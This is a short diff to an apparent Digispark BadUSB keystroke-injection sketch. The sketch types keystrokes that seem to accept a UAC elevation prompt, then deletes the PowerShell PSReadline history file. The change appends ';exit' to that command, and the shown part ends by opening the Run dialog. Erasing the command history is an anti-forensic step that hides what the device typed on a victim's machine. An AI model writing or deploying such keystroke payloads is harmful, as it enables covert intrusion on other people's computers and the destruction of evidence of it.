@@ -37,7 +37,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print(F("del (Get-PSReadlineOption).HistorySavePath"));
+  DigiKeyboard.print(F("del (Get-PSReadlineOption).HistorySavePath;exit"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
